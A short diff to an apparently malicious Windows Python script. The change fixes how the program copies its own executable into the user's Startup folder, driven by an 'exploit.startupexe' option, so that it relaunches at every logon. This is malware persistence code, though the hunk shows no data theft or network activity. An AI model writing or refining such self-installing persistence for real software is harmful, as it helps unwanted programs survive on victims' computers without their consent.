@@ -194,8 +194,9 @@ if __name__ == "__main__" and platform.system() == "Windows":
 
     if exploit.startupexe == "yes":
         startup_path = os.getenv("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
-        if os.path.exists(startup_path + argv[0]):
-            os.remove(startup_path + argv[0])
+        fileName = os.path.split(argv[0])[1]
+        if os.path.exists(startup_path + fileName):
+            os.remove(startup_path + fileName)
             copy2(argv[0], startup_path)
         else:
             copy2(argv[0], startup_path)
